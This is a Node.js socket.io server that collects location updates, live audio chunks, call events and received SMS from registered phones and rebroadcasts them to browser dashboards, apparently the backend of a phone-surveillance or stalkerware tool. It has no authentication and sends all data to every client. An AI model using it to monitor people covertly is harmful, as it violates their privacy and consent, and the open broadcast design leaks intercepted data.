const express = require("express");
const http = require("http");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

let devices = {}; // deviceId → socketId mapping

io.on("connection", (socket) => {
    console.log("Device connected:", socket.id);

    socket.on("device-register", (data) => {
        const deviceId = data.deviceId;
        const deviceName = data.deviceName || "Unknown";

        devices[deviceId] = socket.id;
        console.log(`Registered device: ${deviceName} (${deviceId})`);

        // Send to dashboard (browser clients)
        io.emit("device-registered", { deviceId, deviceName });
    });

    socket.on("location-update", (data) => {
        console.log("Location from", data.deviceId, data);
        io.emit("location-update", data); // re-broadcast to dashboards
    });

    socket.on("audio-chunk", (data) => {
        // data = { deviceId, chunk }
        io.emit("audio-chunk", data);
    });

    socket.on("call-event", (data) => {
        io.emit("call-event", data);
    });

    socket.on("sms-received", (data) => {
        io.emit("sms-received", data);
    });

    socket.on("disconnect", () => {
        console.log("Device disconnected:", socket.id);
        for (let deviceId in devices) {
            if (devices[deviceId] === socket.id) {
                io.emit("device-disconnected", { deviceId });
                delete devices[deviceId];
            }
        }
    });
});

app.use(express.static("public"));

server.listen(3001, () => {
    console.log("Server running on port 3001");
});
